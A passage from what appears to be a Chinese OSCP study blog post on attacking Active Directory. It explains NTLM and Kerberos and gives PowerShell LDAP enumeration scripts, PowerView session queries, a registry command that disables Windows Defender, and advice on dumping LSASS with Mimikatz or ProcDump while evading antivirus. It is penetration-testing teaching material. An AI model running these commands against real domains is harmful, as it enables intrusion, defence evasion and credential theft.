@@ -1,0 +1,1063 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <link rel="icon" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="C47Sh4rk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="域渗透开始">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻击活动目录">
+<meta property="og:url" content="https://c47sh4rk.github.io/2022/08/18/%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95/index.html">
+<meta property="og:site_name" content="C47Sh4rk&#39;s Blog">
+<meta property="og:description" content="域渗透开始">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220820223959.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220820224020.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220820231345.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220821001732.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220821003324.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901154600.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901162550.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901165426.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901170400.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901172004.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901181145.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901181704.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901230101.png">
+<meta property="article:published_time" content="2022-08-18T15:09:20.000Z">
+<meta property="article:modified_time" content="2023-02-26T08:05:47.000Z">
+<meta property="article:author" content="C47Sh4rk">
+<meta property="article:tag" content="OSCP">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="AD域">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220820223959.png">
+  
+  
+  
+  <title>攻击活动目录 - C47Sh4rk&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"c47sh4rk.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>C47Sh4rk&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/0%20(2).png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="攻击活动目录"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-08-18 23:09" pubdate>
+          2022年8月18日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          93 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">攻击活动目录</h1>
+            
+            <div class="markdown-body">
+              
+              <h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><ul>
+<li>Active Directory域在大型企业中实现集中的系统、账号、应用、数据访问管理</li>
+<li>LDAP协议<ul>
+<li>设计用来访问目录数据库的一个协议</li>
+</ul>
+</li>
+<li>域是一个安全边界, 加入域的计算机之间彼此存在信任关系</li>
+<li>由于AD可以是一个非常复杂和细粒度的管理层, 它的攻击面很大</li>
+<li>AD攻击方法主要包括枚举、身份认证、横向纵向移动</li>
+<li>AD安装<ul>
+<li>前提条件: 静态IP地址(hostname dc01)</li>
+<li>服务器管理 &#x3D;&gt; 添加角色和功能</li>
+<li>勾选”Active Directory域服务”</li>
+<li>安装完成后, 右上角单击叹号图标, 单击”将此服务器提升为域控制器”</li>
+<li>DC安装完成后, 将计算和成员服务器加入活动目录域</li>
+</ul>
+</li>
+</ul>
+<h3 id="AD理论"><a href="#AD理论" class="headerlink" title="AD理论"></a>AD理论</h3><ul>
+<li>Active Directory 由几个组件组成。最重要的组件是域控制器 (DC)</li>
+<li>DC存储域中所有配置信息，以及域内对象彼此之间的访问控制规则</li>
+<li>域中可包含多种类型的对象(计算机、用户、组账号、资源、服务等)</li>
+<li>管理员可以通过OU分组存储域内的对象</li>
+<li>AD中每种对象有各自不同的属性Attributes<ul>
+<li>用户属性：first name、last name、Password</li>
+</ul>
+</li>
+<li>常见的成员服务器包括数据库、文件、邮件地址、web等（集成域）</li>
+<li>对外网提供服务的主机也可以加入，但是通常不推荐加入</li>
+<li>AD依赖DNS名称解析，DC几乎总是DNS服务器</li>
+</ul>
+<h2 id="AD枚举"><a href="#AD枚举" class="headerlink" title="AD枚举"></a>AD枚举</h2><h3 id="AD枚举-1"><a href="#AD枚举-1" class="headerlink" title="AD枚举"></a>AD枚举</h3><ul>
+<li>AD渗透针对权限结构进行攻击，并非主机系统漏洞</li>
+<li>AD渗透起始于枚举<ul>
+<li>基于已控制的一台域内成员计算机</li>
+</ul>
+</li>
+<li>域通常使用组账号简化权限管理，枚举高权限组成员（Domain Admins）</li>
+<li>目标是获得高权限账号，完全控制DC<ul>
+<li>DC包含域所有账号密码HASH</li>
+</ul>
+</li>
+</ul>
+<h3 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法"></a>传统方法</h3><ul>
+<li>枚举本地账号<ul>
+<li><code>C:\Users\Offsec.corp&gt; net user</code></li>
+</ul>
+</li>
+<li>枚举远程账号<ul>
+<li><code>C:\Users\Offsec.corp&gt; net user /domain</code></li>
+</ul>
+</li>
+<li>根据名称，查询疑似管理员的账号或现域管理员<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220820223959.png" srcset="/img/loading.gif" lazyload></li>
+<li>枚举域内所有组，关注域管理员组（域用户没法枚举全部组）</li>
+<li>net.exe命令无法查询组层级嵌套关系<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220820224020.png" srcset="/img/loading.gif" lazyload></li>
+<li>组装 LDAP 提供程序路径<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$domainObj</span> = [<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><span class="hljs-variable">$PDC</span> = (<span class="hljs-variable">$domainObj</span>.PdcRoleOwner).Name<br><span class="hljs-variable">$SearchString</span> = <span class="hljs-string">&quot;LDAP://&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$PDC</span> + <span class="hljs-string">&quot;/&quot;</span><br><span class="hljs-variable">$DistinguishedName</span> = <span class="hljs-string">&quot;DC=<span class="hljs-variable">$</span>(<span class="hljs-variable">$domainObj</span>.Name.Replace(&#x27;.&#x27;, &#x27;,DC=&#x27;))&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$DistinguishedName</span><br><span class="hljs-variable">$SearchString</span><br></code></pre></td></tr></table></figure></li>
+<li>用于搜索用户的片段<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$domainObj</span> = [<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><span class="hljs-variable">$PDC</span> = (<span class="hljs-variable">$domainObj</span>.PdcRoleOwner).Name<br><span class="hljs-variable">$SearchString</span> = <span class="hljs-string">&quot;LDAP://&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$PDC</span> + <span class="hljs-string">&quot;/&quot;</span><br><span class="hljs-variable">$DistinguishedName</span> = <span class="hljs-string">&quot;DC=<span class="hljs-variable">$</span>(<span class="hljs-variable">$domainObj</span>.Name.Replace(&#x27;.&#x27;, &#x27;,DC=&#x27;))&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$DistinguishedName</span><br><span class="hljs-variable">$Searcher</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectorySearcher([<span class="hljs-type">ADSI</span>]<span class="hljs-variable">$SearchString</span>)<br><span class="hljs-variable">$objDomain</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectoryEntry<br><span class="hljs-variable">$Searcher</span>.SearchRoot = <span class="hljs-variable">$objDomain</span><br><span class="hljs-comment">## $Searcher.filter=&quot;samAccountType=805306368&quot;  ## 用户</span><br><span class="hljs-comment">## $Searcher.filter=&quot;samAccountType=805306369&quot; ## 计算机</span><br><span class="hljs-comment">## $Searcher.filter=&quot;samAccountType=268435456&quot; ## 组</span><br><span class="hljs-variable">$Searcher</span>.FindAll()<br></code></pre></td></tr></table></figure></li>
+<li>枚举所有用户的 PowerShell 脚本<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$domainObj</span> = [<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><span class="hljs-variable">$PDC</span> = (<span class="hljs-variable">$domainObj</span>.PdcRoleOwner).Name<br><span class="hljs-variable">$SearchString</span> = <span class="hljs-string">&quot;LDAP://&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$PDC</span> + <span class="hljs-string">&quot;/&quot;</span><br><span class="hljs-variable">$DistinguishedName</span> = <span class="hljs-string">&quot;DC=<span class="hljs-variable">$</span>(<span class="hljs-variable">$domainObj</span>.Name.Replace(&#x27;.&#x27;, &#x27;,DC=&#x27;))&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$DistinguishedName</span><br><span class="hljs-variable">$Searcher</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectorySearcher([<span class="hljs-type">ADSI</span>]<span class="hljs-variable">$SearchString</span>)<br><span class="hljs-variable">$objDomain</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectoryEntry<br><span class="hljs-variable">$Searcher</span>.SearchRoot = <span class="hljs-variable">$objDomain</span><br><span class="hljs-variable">$Searcher</span>.filter=<span class="hljs-string">&quot;samAccountType=805306368&quot;</span>  <span class="hljs-comment">## 用户</span><br><span class="hljs-variable">$Searcher</span>.FindAll()<br><span class="hljs-keyword">Foreach</span>(<span class="hljs-variable">$obj</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Result</span>)<br>&#123;<br>    <span class="hljs-keyword">Foreach</span>(<span class="hljs-variable">$prop</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$obj</span>.Properties)<br>    &#123;<br>        <span class="hljs-variable">$prop</span><br>    &#125;<br>&#125;<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;------------------------&quot;</span> &#125;<br></code></pre></td></tr></table></figure></li>
+<li>修改 PowerShell 脚本以枚举所有域组<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$domainObj</span> = [<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><span class="hljs-variable">$PDC</span> = (<span class="hljs-variable">$domainObj</span>.PdcRoleOwner).Name<br><span class="hljs-variable">$SearchString</span> = <span class="hljs-string">&quot;LDAP://&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$PDC</span> + <span class="hljs-string">&quot;/&quot;</span><br><span class="hljs-variable">$DistinguishedName</span> = <span class="hljs-string">&quot;DC=<span class="hljs-variable">$</span>(<span class="hljs-variable">$domainObj</span>.Name.Replace(&#x27;.&#x27;, &#x27;,DC=&#x27;))&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$DistinguishedName</span><br><span class="hljs-variable">$Searcher</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectorySearcher([<span class="hljs-type">ADSI</span>]<span class="hljs-variable">$SearchString</span>)<br><span class="hljs-variable">$objDomain</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectoryEntry<br><span class="hljs-variable">$Searcher</span>.SearchRoot = <span class="hljs-variable">$objDomain</span><br><span class="hljs-variable">$Searcher</span>.filter=<span class="hljs-string">&quot;(objectClass=Group)&quot;</span><br><span class="hljs-variable">$Result</span> = <span class="hljs-variable">$Searcher</span>.FindAll()<br><span class="hljs-keyword">Foreach</span>(<span class="hljs-variable">$obj</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Result</span>)<br>&#123;<br>    <span class="hljs-variable">$obj</span>.Properties.name<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li>用于枚举组成员的 PowerShell 脚本<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$domainObj</span> = [<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><span class="hljs-variable">$PDC</span> = (<span class="hljs-variable">$domainObj</span>.PdcRoleOwner).Name<br><span class="hljs-variable">$SearchString</span> = <span class="hljs-string">&quot;LDAP://&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$PDC</span> + <span class="hljs-string">&quot;/&quot;</span><br><span class="hljs-variable">$DistinguishedName</span> = <span class="hljs-string">&quot;DC=<span class="hljs-variable">$</span>(<span class="hljs-variable">$domainObj</span>.Name.Replace(&#x27;.&#x27;, &#x27;,DC=&#x27;))&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$DistinguishedName</span><br><span class="hljs-variable">$Searcher</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectorySearcher([<span class="hljs-type">ADSI</span>]<span class="hljs-variable">$SearchString</span>)<br><span class="hljs-variable">$objDomain</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectoryEntry<br><span class="hljs-variable">$Searcher</span>.SearchRoot = <span class="hljs-variable">$objDomain</span><br><span class="hljs-variable">$Searcher</span>.filter=<span class="hljs-string">&quot;(name=Domain Admins)&quot;</span><br><span class="hljs-keyword">Foreach</span>(<span class="hljs-variable">$obj</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Result</span>)<br>&#123;<br>    <span class="hljs-variable">$obj</span>.Properties.member<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="查询当前已登录的账号"><a href="#查询当前已登录的账号" class="headerlink" title="查询当前已登录的账号"></a>查询当前已登录的账号</h3><ul>
+<li>当前登录账号的HASH缓存在内存中，找到属于高权限组的账号（Domain Admins）</li>
+<li>从工作站本地管理员，提权到服务器管理员，再提权到域管理员（连锁提权）<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220820231345.png" srcset="/img/loading.gif" lazyload></li>
+<li>首先枚举域中所有计算机，然后使用NetWkstaUserEnum查询所有计算机当前登录账号<ul>
+<li>需要拥有目标主机本地管理员权限</li>
+</ul>
+</li>
+<li>使用NetSessionEnum查询服务器上的活动用户会话（普通权限即可）</li>
+<li>禁用Defender<ul>
+<li>REG ADD “\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender” &#x2F;v DisableAntiSpyware &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</li>
+<li>gpupdate &#x2F;force</li>
+</ul>
+</li>
+<li>导入PowerView<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1</a></li>
+<li>使用PowerView简化流程并有助于避免端点安全检测</li>
+<li><code>PS C:\Tools\active_directory&gt; Import-Module .\PowerView.ps1</code></li>
+<li><code>Get-NetLoggedon</code> 函数执行NetWkstaUserEnum</li>
+<li><code>Get-NetSession</code> 函数执行NetSessionEnum</li>
+</ul>
+</li>
+<li>查询客户端计算机当前登录账号<ul>
+<li><code>PS C:\Tools\active_directory&gt; Get-NetLoggedon -ComputerName client251</code></li>
+</ul>
+</li>
+<li>查询DC的活动会话<ul>
+<li><code>PS C:\Tools\active_directory&gt; Get-NetSession -ComputerName dc01</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="通过SPN名枚举"><a href="#通过SPN名枚举" class="headerlink" title="通过SPN名枚举"></a>通过SPN名枚举</h3><ul>
+<li>服务主体名称（SPN）是AD中的一种名称，客户端使用它唯一的标识服务实例</li>
+<li>服务可能以高权限账号允许，LocalSystem、LocalService、NetworkService、域账号</li>
+<li>当Exchange、SQL、IIS等应用集成AD部署时，SPNs作为服务实例的唯一标识符</li>
+<li>通过枚举域中所有已注册的 SPN，我们可以获得在与目标 Active Directory 集成的服务器上运行的应用程序的 IP 地址和端口号，从而限制了对广泛端口扫描的需求</li>
+<li>查询DC中存在的SPNs<ul>
+<li><code>$Searcher.filter=&quot;serviceprincipalname=*http*&quot;</code></li>
+</ul>
+</li>
+<li>系统自带命令查询SPN<ul>
+<li><code>setspn -T lab -F -Q */*</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="AD身份攻击"><a href="#AD身份攻击" class="headerlink" title="AD身份攻击"></a>AD身份攻击</h2><h3 id="AD身份认证"><a href="#AD身份认证" class="headerlink" title="AD身份认证"></a>AD身份认证</h3><ul>
+<li>AD支持多种认证协议、技术，支持Windows、Linux、MacOS系统集中认证</li>
+<li>大多数情况下，活动目录使用Kerberos、NTLM两种身份认证协议</li>
+<li>WDigest认证协议支持Win7、2008 R2等早期版本的操作系统<ul>
+<li>这个使用明文密码</li>
+</ul>
+</li>
+</ul>
+<h3 id="NTLM认证过程"><a href="#NTLM认证过程" class="headerlink" title="NTLM认证过程"></a>NTLM认证过程</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220821001732.png" srcset="/img/loading.gif" lazyload></p>
+<ol>
+<li>客户端计算用户密码，生成NTLM HASH</li>
+<li>客户端将用户名发给应用服务器</li>
+<li>应用服务器返回Nonce随机值给客户端</li>
+<li>客户端使用NTLM HASH加密Nonce，然后发回给应用服务器</li>
+<li>APP服务器将用户名+Nonce+加密的Nonce全部发给DC</li>
+<li>DC使用用户的 NTLM HASH对Nonce本身进行加密，并将其与从服务器收到的响应进行比较。如果两者相等，则认证请求成功</li>
+</ol>
+<ul>
+<li>NTLM算法虽然不可逆，但简单密码可在几天内破解<ul>
+<li>8个字符2.5h</li>
+<li>9个字符11d</li>
+</ul>
+</li>
+</ul>
+<h3 id="Kerberos认证过程"><a href="#Kerberos认证过程" class="headerlink" title="Kerberos认证过程"></a>Kerberos认证过程</h3><ul>
+<li>由MIT开发，Windows 2003开始作为AD默认的身份认证协议</li>
+<li>Windows的Kerberos认证使用票据，DC作为密钥分发中心KDC和认证服务器AS<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220821003324.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<ol>
+<li>登录用户域内计算机时，基于密码生成NTLM HASH。向DC发送AS_REQ，其中包含用户名+NTLM HASH加密的时间戳；DC使用用户的NTLM HASH解密时间戳，如果解密成功且时间戳不重复（防重放攻击），则认证成功</li>
+<li>DC返回AS_REP，包含用户NTLM HASH加密的会话密钥+TGT（Ticket Granting Ticket）；TGT包含用户、组成员、域、时间戳、客户端IP、会话密钥等信息。TGT使用KDC独有的安全密钥加密，客户端无法解密，TGT的生存周期为10小时，周期自动刷新（缓存于客户端）</li>
+<li>用户需要访问域内资源（SPN），再次联系KDC；向其请求服务票据TGS_REQ，其中包含会话密钥加密的当前用户名和时间戳+资源SPN+TGT</li>
+<li>如果SPN存在（不验证用户是否有权访问SPN），KDC解密TGT获得会话密钥，用会话密钥解密出用户吗和时间戳，</li>
+</ol>
+<ul>
+<li>接下来执行以下检查:<ol>
+<li>TGT中的时间戳有效（无重放攻击且未过期）</li>
+<li>TGS_REQ和TGT中的用户名一致</li>
+<li>客户端IP与TGT中的客户端IP一致</li>
+</ol>
+</li>
+<li>如果检查成功，TGS向客户端返回TGS_REP，包含以下内容<ol>
+<li>授权访问的SPN</li>
+<li>客户端和SPN之间使用的会话密钥</li>
+<li>包含用户名和组成员关系以及创建新的会话密钥的服务票据ST</li>
+</ol>
+<ul>
+<li>前两个部分（SPN+会话密钥）使用TGT中的会话密钥加密。ST使用SPN服务账号的NTLM HASH加密，并缓存与客户端</li>
+</ul>
+</li>
+<li>至此KDC认证过程结束，客户端获得了会话密钥+ST，接下来开始服务认证过程</li>
+</ul>
+<ol start="5">
+<li>客户端向应用服务器发起AP_REQ，其中包含会话密钥加密的用户名和时间戳+ST（包含会话密钥）</li>
+<li>应用服务器使用服务账号密码的HASH解密ST，获得用户名+会话密钥，使用会话密钥解密AP_REQ中的用户吗，如果用户吗从ST解密得到的用户名一致，请求被接受。授予访问权限之前，服务检查ST中提供的组成员关系，并为用户分配适当的权限，至此用户可以访问请求的服务了</li>
+</ol>
+<h3 id="缓存凭证存储和检索"><a href="#缓存凭证存储和检索" class="headerlink" title="缓存凭证存储和检索"></a>缓存凭证存储和检索</h3><ul>
+<li><p>微软基于Kerberos实现了AD单点登录，密码哈希存储在LSASS内存空间中，用于首期更新TGT请求。如果得到密码HASH，则可以爆破密码或执行PtH攻击</p>
+</li>
+<li><p>LSASS以SYSTEM账号允许，需要管理员或SYSTEM全新啊才有权访问。因此成功的本地提权是发起后续攻击的前提。</p>
+</li>
+<li><p>内存中存储HASH的数据结构未公开，同时还被LSASS存储密钥所加密</p>
+<ul>
+<li>Mimikatz可用于提HASH</li>
+</ul>
+</li>
+<li><p>为避免Mimikatz被杀软检测，可以使用powershell在内存中加载Mimikatz，或DUMP整个LSASS进程内存，将其拷贝到其他计算机中由Mimikatz读取</p>
+<ul>
+<li>ProcDump可DUMP进程内存</li>
+</ul>
+</li>
+<li><p>禁用Defender</p>
+<ul>
+<li><code>REG ADD &quot;\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f</code></li>
+<li><code>gpupdate /force</code></li>
+</ul>
+</li>
